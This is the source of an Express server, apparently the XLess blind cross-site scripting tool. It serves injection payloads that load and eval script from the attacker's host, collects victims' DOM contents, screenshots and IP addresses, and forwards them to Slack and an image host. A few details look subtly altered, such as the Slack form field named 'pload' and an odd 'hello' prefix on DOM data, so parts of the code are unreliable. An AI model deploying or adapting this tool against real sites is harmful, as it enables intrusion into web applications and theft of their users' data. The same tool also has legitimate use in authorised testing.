const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const process = require("process");
const request = require("request");
const path = require("path");

// Support local development with .env
require("dotenv").config();

const port = process.env.PORT || 3000;
const imgbb_api_key = process.env.IMGBB_API_KEY;
const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK;

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: "15mb" }));
app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));

app.use((req, res, next) => {
  // Headers
  res.header("Powered-By", "XLESS");
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  res.header("Access-Control-Allow-Credentials", "true");
  next();
});

function generate_blind_xss_alert(body) {
  let alert = "*XSSless: Blind XSS Alert*\n";
  for (const k of Object.keys(body)) {
    if (k === "Screenshot") {
      continue;
    }
    if (k === "DOM") {
      body[k] = `\n\nhello ${body[k]}\n\n`;
    }

    if (body[k] === "") {
      alert += `*${k}:* \`None\`\n`;
    } else {
      alert += `*${k}:* \n\`${body[k]}\`\n`;
    }
  }
  return alert;
}

function generate_callback_alert(headers, data, url) {
  let alert = "*XSSless: Out-of-Band Callback Alert*\n";
  alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`;
  alert += `• *Request URI:* \`${url}\`\n`;

  // Add all the headers
  for (const key in headers) {
    if (Object.prototype.hasOwnProperty.call(headers, key)) {
      alert += `• *${key}:* \`${headers[key]}\`\n`;
    }
  }
  return alert;
}

function generate_message_alert(body) {
  return `*XSSless: Message Alert*\n\`\`\`\n${body}\n\`\`\`\n`;
}

async function uploadImage(image) {
  return new Promise((resolve, reject) => {
    const options = {
      method: "POST",
      url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
      headers: {
        "Content-Type": "multipart/form-data",
      },
      formData: {
        image: image,
      },
    };

    request(options, (err, imgRes, imgBody) => {
      if (err) {
        reject(err);
      } else {
        resolve(imgBody);
      }
    });
  });
}

app.get("/examples", (req, res) => {
  let url = "https://" + req.headers["host"];
  let page = '';
  page += `\'"><script src="${url}"></script>\n\n`;
  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)');\n\n`;
  page += `<script>function b() { eval(this.responseText); }; a = new XMLHttpRequest(); a.addEventListener("load", b); a.open("GET", "${url}"); a.send();</script>\n\n`;
  page += `<script>$.getScript("${url}");</script>`;
  res.type("text/plain").send(page);
});

app.all("/message", (req, res) => {
  const message = req.query.text || req.body.text;
  const alert = generate_message_alert(message);
  const data = {
    form: {
      pload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
    },
  };

  request.post(slack_incoming_webhook, data, (error) => {
    if (error) return res.status(500).send("Internal Server Error");
    res.send("ok\n");
  });
});

app.post("/c", async (req, res) => {
  const data = req.body;
  data["Screenshot URL"] = "";

  if (imgbb_api_key && data["Screenshot"]) {
    const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,", "");

    try {
      const imgRes = await uploadImage(encoded_screenshot);
      const imgOut = JSON.parse(imgRes);
      if (imgOut.error) {
        data["Screenshot URL"] = "NA";
      } else if (imgOut.data && imgOut.data.url_viewer) {
        data["Screenshot URL"] = imgOut.data.url_viewer;
      }
    } catch (e) {
      data["Screenshot URL"] = e.message;
    }
  }

  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const alert = generate_blind_xss_alert(data);
  const slackData = {
    form: {
      pload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
    },
  };

  request.post(slack_incoming_webhook, slackData, (error) => {
    if (error) return res.status(500).send("Internal Server Error");
    res.send("ok\n");
  });
});

app.get("/health", async (req, res) => {
  const health_data = {};
  health_data.IMGBB_API_KEY = Boolean(imgbb_api_key);
  health_data.SLACK_INCOMING_WEBHOOK = Boolean(slack_incoming_webhook);

  if (!health_data.IMGBB_API_KEY || !health_data.SLACK_INCOMING_WEBHOOK) {
    return res.status(400).json(health_data);
  }

  // Example image data (should be a valid image)
  const xless_logo =
    "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";

  try {
    const imgRes = await uploadImage(xless_logo);
    const imgOut = JSON.parse(imgRes);
    if (imgOut.error) {
      health_data.imgbb_response = imgOut.error;
    } else if (imgOut && imgOut.data && imgOut.data.url_viewer) {
      health_data.imgbb_response = imgOut.data.url_viewer;
    }
  } catch (e) {
    health_data.imgbb_response = e.message;
  }

  res.json(health_data);
});

app.all("/", (req, res) => {
  const headers = req.headers;
  const data = req.body || {};
  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const alert = generate_callback_alert(headers, data, req.url);
  const slackData = {
    form: {
      pload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
    },
  };

  request.post(slack_incoming_webhook, slackData, (error) => {
    if (error) return res.status(500).send("Internal Server Error");
    res.sendFile(path.join(__dirname, "pload.js"));
  });
});

app.listen(port, (err) => {
  if (err) throw err;
  console.log(`> Ready On Server http://localhost:${port}`);
});
